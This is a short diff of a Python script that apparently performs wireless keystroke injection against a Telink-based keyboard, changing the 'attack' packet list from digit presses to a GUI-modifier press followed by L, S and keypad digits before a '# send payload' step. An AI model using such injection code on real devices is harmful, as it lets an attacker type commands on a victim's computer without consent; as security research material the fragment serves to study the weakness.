@@ -33,11 +33,11 @@ preamble =b"\xAA\xAA\xB5"
 
 
 attack = [
-    trust_keyboard.build_packet([Tlsr85KeyboardScancode.NUM_1]),
-    trust_keyboard.build_packet([Tlsr85KeyboardScancode.NUM_2]),
-    trust_keyboard.build_packet([Tlsr85KeyboardScancode.NUM_3]),
-    trust_keyboard.build_packet([Tlsr85KeyboardScancode.NUM_4]),
-    trust_keyboard.build_packet([Tlsr85KeyboardScancode.NUM_5])
+    trust_keyboard.build_packet(modifiers=[Tlsr85KeyboardModifiers.MODIFIER_GUI_LEFT]),
+    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_L]),
+    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_S]),
+    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_KEYPAD_0]),
+    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_KEYPAD_1])
     ]
 
 # send payload
